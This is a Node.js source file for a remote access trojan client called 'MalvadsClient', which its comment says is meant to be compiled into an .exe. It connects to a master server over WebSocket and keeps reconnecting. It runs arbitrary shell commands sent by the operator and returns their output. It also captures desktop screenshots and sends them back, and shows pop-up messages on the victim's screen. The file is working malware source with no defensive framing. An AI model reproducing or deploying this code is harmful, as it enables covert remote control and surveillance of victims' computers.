/*

    This should be an compiled .exe program

*/

const config = {
    'master_server': '127.0.0.1',
    'master_port': 8082,
}

const WebSocket = require('ws')
const mitsobox = require('mitsobox')
const { exec } = require('child_process')
const screenshot = require('desktop-screenshot')
const imageToBase64 = require('image-to-base64')

class MalvadsClient {
    constructor() {
        this.socket = null
        this.connect()
    }
    connect() {
        this.socket = new WebSocket(`ws://${config.master_server}:${config.master_port}`)
        this.socket.binaryType = 'arraybuffer'
        this.socket.onmessage = this.onmessage.bind(this)
        this.socket.onclose = this.onclose.bind(this)
        this.socket.onerror = this.onerror.bind(this)
    }
    onmessage(e) {
        
        const msg = JSON.parse(e.data)
        switch (msg.type) {
            case 'img':
                const u = this
                screenshot("frame.png", function (error, complete) {
                    function sendImg(base64){
                        const msg = {
                            type:"img",
                            content: base64
                        }
                        u.socket.send(JSON.stringify(msg))
                    }
                    if (error) {
                    }
                    else {
                        imageToBase64('frame.png')
                            .then(
                                (response) => {
                                    sendImg(response)
                                }
                            )
                            .catch(
                                (error) => {
                                    console.log(error)
                                }
                            )
                    }
                }.bind(this))
                break
            case 'msg':
                mitsobox.ok("Master Server...", msg.content);
                break
            case 'cmd':
                exec(msg.content, function (err, stdout, stderr) {
                    if (err) {
                        return;
                    }
                    this.socket.send(JSON.stringify({
                        type: 'cmd',
                        content: stdout
                    }))
                }.bind(this))
                break
        }
    }
    onclose() {
        setTimeout(function () {
            this.connect()
        }.bind(this), 5e3)
    }
    onerror() {
        setTimeout(function () {
            this.connect()
        }.bind(this), 5e3)
    }
}

new MalvadsClient()